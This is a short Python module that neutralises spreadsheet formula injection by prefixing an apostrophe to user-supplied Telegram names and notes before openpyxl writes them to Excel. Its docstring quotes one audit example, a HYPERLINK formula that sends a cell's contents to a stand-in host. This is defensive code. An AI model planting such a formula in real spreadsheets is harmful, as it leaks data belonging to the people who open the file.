"""Values written into an Excel file that Excel will never run (the 2026-11-15 audit): names and notes come
from Telegram users, and openpyxl stores any text starting with "=" as a formula - a Telegram name like
=HYPERLINK("http://x/?"&B2, "ok") became a live formula in the owner's or a center's spreadsheet."""
from __future__ import annotations

FORMULA_START = ("=", "+", "-", "@", "\t", "\r")


def safe(value):
    """A text that would start a formula, quoted; anything else as it is."""
    if isinstance(value, str) and value[:1] in FORMULA_START:
        return "'" + value
    return value


def safe_row(row) -> list:
    return [safe(v) for v in row]
